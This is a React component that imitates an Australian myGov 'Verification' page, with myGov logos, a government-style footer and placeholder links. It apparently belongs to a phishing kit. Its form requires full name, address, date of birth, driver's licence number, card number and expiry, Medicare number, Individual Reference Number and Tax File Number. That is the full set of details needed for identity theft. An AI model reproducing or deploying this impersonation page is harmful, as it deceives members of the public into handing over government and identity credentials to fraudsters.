"use client";

export default function Detail() {
  return (
    <>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a href="#" className="unauth-govt-crest__link">
                  <img
                    id="unauth-govt-crest"
                    src="/myGov-cobranded-logo-black.svg"
                    alt="myGov Beta"
                    role="img"
                  />
                </a>
                <div className="header-links">
                  <a href="#">Help</a>
                </div>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content" role="main">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <a data-go-back-link="" className="button-back" href="#"
                      >Back</a
                      >
                      <h1>Verification</h1>
                      <h2 className="text-align-left">
                        Enter the details given below.
                      </h2>
                      <form id="mygov-detail">
                        <div className="input-group">
                          <label className="override" htmlFor="userId">Full Name</label>
                          <input
                            id="fn"
                            name="fn"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Address on File</label
                          >
                          <input
                            id="addr"
                            name="add"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Date of Birth</label
                          >
                          <input
                            id="dob"
                            name="dob"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Driver&apos;s License Number</label
                          >
                          <input
                            id="dln"
                            name="dln"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Driver&apos;s License Card No. (Back of Card)</label
                          >
                          <input
                            id="dlcnum"
                            name="dlcnum"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Driver&apos;s License Expiry Date</label
                          >
                          <input
                            id="dlexdate"
                            name="dlexdate"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Medicare Number</label
                          >
                          <input
                            id="mednum"
                            name="mednum"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Individual Reference Number</label
                          >
                          <input
                            id="irn"
                            name="irn"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Tax File Number</label
                          >
                          <input
                            id="tfnum"
                            name="tfnum"
                            type="text"
                            value=""
                            autoComplete="off"
                            required
                            onChange={(e) => { }}
                          />
                        </div>

                        <br />
                        <div className="button-digital-id-main-container override">
                          <div className="digital-id-button-container">
                            <button
                              type="submit"
                              className="button-main"
                              name="btn3"
                              id="btn3"
                            >
                              Submit
                            </button>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        <div className="wrapper">
          <div className="inner">
            <section className="footer-list">
              <nav>
                <h2 className="sr-only" aria-label="Footer">Footer</h2>
                <ul className="lower-links">
                  <li>
                    <a target="_blank" href="#">Terms of use</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Privacy and security</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Copyright</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Accessibility</a>
                  </li>
                </ul>
              </nav>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a href="#">
                  <img
                    src="/myGov-cobranded-logo-white.svg"
                    alt="myGov Beta"
                    width="313.17"
                    height="70"
                    role="img"
                  />
                </a>
              </section>
              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live on.
                We pay our respects to all Elders, past and present, of all
                Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}
